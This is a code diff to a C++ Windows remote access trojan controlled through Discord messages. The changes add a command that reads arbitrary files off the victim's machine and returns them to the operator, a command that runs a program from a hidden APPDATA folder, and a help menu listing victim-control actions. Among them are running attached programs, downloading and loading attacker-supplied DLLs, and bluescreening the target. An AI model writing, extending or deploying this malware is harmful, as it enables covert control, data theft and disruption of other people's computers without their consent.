@@ -1,9 +1,9 @@
+
 #include "tasks.h"
-#include <Windows.h>
 #include <TlHelp32.h>
 #include <wtsapi32.h>
 #include "helper.h"
-
+#include <Windows.h>
 
 /* all windows specific stuff such as popups */
 
@@ -29,7 +29,7 @@ std::string command_popup(std::vector<std::string> args) {
 			msg += args[i] + ' ';
 		}
 
-		MessageBoxA(NULL, msg.c_str(), "Message", MB_OK);
+		MessageBoxA(NULL, msg.c_str(), "", MB_OK);
 	}
 
 	return "Popup Sent!";
@@ -169,6 +169,22 @@ std::string command_runprogram(std::vector<std::string> args, const dpp::message
 	return "Ran Program Successfuly!";
 }
 
+std::string command_readfile(std::vector<std::string> args, const dpp::message_create_t evnt) {
+	if (args.size() < 2)
+		return "Please Provide a Path to the File";
+	FILE* f = fopen(args[1].c_str(), "rb");
+	fseek(f, 0, SEEK_END);
+	long fsize = ftell(f);
+	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
+
+	char* string = new char[fsize + 1];
+	fread(string, fsize, 1, f);
+	fclose(f);
+	string[fsize] = '\0';
+
+	return string;
+}
+
 std::string command_loadlibrary(std::vector<std::string> args, const dpp::message_create_t evnt) {
 	if (evnt.msg.attachments.size() < 1)
 		return "Please attatch a .dll file to run on the target computer";
@@ -180,6 +196,37 @@ std::string command_loadlibrary(std::vector<std::string> args, const dpp::messag
 	URLDownloadToFileA(NULL, evnt.msg.attachments[0].url.c_str(), (getenv("APPDATA") + (std::string)"/slavcache/file.dll").c_str(), 0, NULL);
 	LoadLibraryA((getenv("APPDATA") + (std::string)"/slavcache/file.dll").c_str());
 	return "Loaded Library Successfuly";
+}
+
+std::string command_custom(std::vector<std::string> args, const dpp::message_create_t evnt) {
+	std::string path = getenv("APPDATA") + (std::string)"/slavcache";
+
+	// additional information
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+
+	// set the size of the structures
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	// start the program up
+	bool worked = CreateProcessA(path.c_str(),   // the path
+		NULL,        // Command line
+		NULL,           // Process handle not inheritable
+		NULL,           // Thread handle not inheritable
+		FALSE,          // Set handle inheritance to FALSE
+		0,              // No creation flags
+		NULL,           // Use parent's environment block
+		NULL,           // Use parent's starting directory 
+		&si,            // Pointer to STARTUPINFO structure
+		&pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
+	);
+
+	if (worked)
+		return "Process Executed Successfuly!";
+	else
+		return "Process Failed to Execute.";
+
 }
 
 HANDLE GetProcessFromName(const char* name) {
@@ -223,6 +270,21 @@ std::string command_changebackround(std::vector<std::string> args, const dpp::me
 	return "Changed Backround!";
 }
 
+std::string command_help(std::vector<std::string> args) {
+	return "cd {directory} - change active directory to {directory}\n"
+		"pwd - lists active path\n"
+		"ls - lists all files and directorys in the active directory\n"
+		"popup {msg} - pops up {msg} on the targets screen\n"
+		"cmdspawn {amount of windows} {message} {seconds} - pops up a {amount of windows} of command prompt with the message of {msg} for {seconds} seconds\n"
+		"appclose {appid}/{appname} - closes the application with the proccess id of {appid} or with the name of {appname}\n"
+		"applist - lists all applications and their proccess ids\n"
+		"runprogram - runs the program attatched to the message\n"
+		"loadlibrary - loads the library attatched to the message\n"
+		"changebackround - changes the background image of the targets desktop to the attatched image\n"
+		"downloadfile - downloads the attatched file\n"
+		"bluescreen - bluescreens the target computer\n"
+		"help - this message";
+}
 
 
 bool ends_with(std::string const& fullString, std::string const& ending) {
